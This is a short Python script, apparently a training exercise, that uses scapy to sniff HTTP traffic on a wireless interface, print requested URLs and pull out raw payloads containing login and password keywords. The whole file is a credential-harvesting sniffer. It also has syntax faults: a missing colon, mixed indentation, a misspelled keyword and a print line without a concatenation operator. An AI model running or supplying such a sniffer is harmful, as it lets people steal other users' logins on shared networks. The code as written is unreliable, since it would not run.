# print(packet.show()) - print all information in packet
# packet[name layer].pole - packet[http.HTTPRequest].host

#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #+filter="port 80"

def get_url(packet):
	return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
	if packet.haslayer(scapy.Raw)
	        load = packet[scapy.Raw].load
                keywords = ["usename", "user", "name", "login", "password", "pass"]
                for keyword in keywords:
	                if keyword in load:
        	                return load


def process_sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("[+] HTTP Request >> " + url)
		
		login_info = get_login_info(packet)
		if login_info:
			print("[+] Logon or password is found >> "login_info)

sniff("wlan0")
